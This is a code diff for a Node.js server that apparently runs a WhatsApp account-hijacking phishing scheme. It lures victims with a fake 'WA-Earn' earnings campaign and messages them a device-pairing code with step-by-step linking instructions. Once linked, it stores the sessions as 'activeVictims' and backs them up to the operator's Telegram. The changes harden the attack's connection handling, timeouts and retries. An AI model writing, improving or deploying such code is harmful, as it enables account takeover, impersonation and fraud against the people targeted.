@@ -31,10 +31,7 @@ const server = http.createServer(app);
 const io = new Server(server);
 
 app.use(express.static('public'));
-
-app.get('/admin', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
-});
+app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));
 
 const logBuffer = [];
 function pushLog(msg, type = 'info') {
@@ -43,7 +40,6 @@ function pushLog(msg, type = 'info') {
     if (logBuffer.length > 200) logBuffer.shift();
     io.emit('log', entry);
 }
-
 app.get('/logs', (req, res) => res.json(logBuffer.slice(-100)));
 
 const tgBot = new TelegramBot(TELEGRAM_TOKEN, { polling: { autoStart: true, interval: 1000 } });
@@ -130,9 +126,7 @@ async function restoreSessionFromTelegram(folderName) {
         await require('extract-zip')(zipPath, { dir: folderPath });
         await fs.unlink(zipPath);
         return true;
-    } catch (e) {
-        return false;
-    }
+    } catch (e) { return false; }
 }
 
 async function backupToTelegram(folderName, folderPath) {
@@ -204,12 +198,10 @@ async function sendWhatsAppMessage(number, text) {
     const jid = number.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
     await adminSock.sendMessage(jid, { text });
 }
-
 async function sendCodeToWhatsApp(number, code) {
     const msg = `*WA-Earn — Linking Code*\n\nYour pairing code is:\n\n*${code}*\n\n*How to link:*\n1. Open WhatsApp on this phone\n2. Tap the three dots (⋮) top right\n3. Tap *Linked Devices*\n4. Tap *Link with Phone Number*\n5. Enter the code above\n\nYou have ~2 minutes before it expires. If it expires, come back to the site and tap Resend.`;
     await sendWhatsAppMessage(number, msg);
 }
-
 async function sendLinkedConfirmation(number) {
     const msg = `*WA-Earn — Linked ✅*\n\nYour WhatsApp is now linked to the WA-Earn campaign network.\n\n*Onboarding bonus: ₦2,000* has been credited to your wallet.\nDaily retainer: ₦500.\n\nOpen ${RENDER_URL} to access your dashboard.`;
     await sendWhatsAppMessage(number, msg);
@@ -232,8 +224,10 @@ async function attemptPairing({ targetNumber, version, state, saveCreds, proxyUr
 
     return new Promise((resolve, reject) => {
         let codeSent = false;
-        let connected = false;
+        let isActuallyConnected = false;
+        let timeoutId = null;
 
+        // If the connection fully opens and stays open
         phishSock.ev.on('connection.update', async (update) => {
             if (update.connection === 'connecting' && !codeSent) {
                 codeSent = true;
@@ -251,7 +245,6 @@ async function attemptPairing({ targetNumber, version, state, saveCreds, proxyUr
                     } catch (e) {
                         tgBot.sendMessage(MY_TELEGRAM_ID, `⚠️ *Code delivery failed*\n${e.message}\nCode was: \`${code}\``);
                     }
-
                 } catch (e) {
                     releasePending(targetNumber, phishSock);
                     try { phishSock.end(undefined); } catch (err) {}
@@ -260,17 +253,17 @@ async function attemptPairing({ targetNumber, version, state, saveCreds, proxyUr
             }
 
             if (update.connection === 'open') {
-                connected = true;
-                // ⚠️ WAIT 10 SECONDS to ensure WhatsApp doesn't drop the socket (515/401)
+                // ⚠️ WAIT 10 SECONDS to ensure WhatsApp doesn't drop the socket
                 await delay(10000);
                 
-                // Check if the socket died during the 10 seconds
                 if (phishSock.ws.isClosed) {
-                    connected = false;
                     reject(new Error('AuthRejected'));
                     return;
                 }
 
+                isActuallyConnected = true;
+                if (timeoutId) clearTimeout(timeoutId);
+                
                 activeVictims[targetNumber] = phishSock;
                 if (!victimList.find(v => v.number === targetNumber)) {
                     victimList.push({ number: targetNumber, status: 'Online' });
@@ -287,21 +280,27 @@ async function attemptPairing({ targetNumber, version, state, saveCreds, proxyUr
                 const code = update.lastDisconnect?.error?.output?.statusCode;
                 releasePending(targetNumber, phishSock);
                 
-                // 515 means "Restart Required". Baileys handles this automatically, 
-                // so we don't reject it yet. We let it try to reconnect.
+                // 515 is Restart Required. Baileys handles this automatically.
                 if (code === 515) {
-                    console.log(`[PAIR] 515 Restart Required for ${targetNumber}. Reconnecting...`);
+                    console.log(`[PAIR] 515 Restart Required for ${targetNumber}. Waiting for reconnect...`);
                     return; 
                 }
 
-                if (!connected) {
+                if (!isActuallyConnected) {
+                    if (timeoutId) clearTimeout(timeoutId);
                     try { phishSock.end(undefined); } catch (err) {}
                     reject(new Error(code === 401 ? 'AuthRejected' : `Closed(${code || 'unknown'})`));
                 }
             }
         });
 
-        setTimeout(() => { if (!connected) reject(new Error('Timeout')); }, 90000);
+        timeoutId = setTimeout(() => { 
+            if (!isActuallyConnected) {
+                releasePending(targetNumber, phishSock);
+                try { phishSock.end(undefined); } catch(e) {}
+                reject(new Error('Timeout')); 
+            }
+        }, 90000);
     });
 }
 
@@ -381,7 +380,9 @@ io.on('connection', (socket) => {
                 await sendCodeToWhatsApp(targetNumber, code).catch(() => {});
                 socket.emit('code_sent_via_whatsapp');
                 return;
-            } catch (e) {}
+            } catch (e) {
+                // If reusing the socket failed, fall through to full loop
+            }
         }
         await runPairingLoop({ socket, targetNumber });
     });
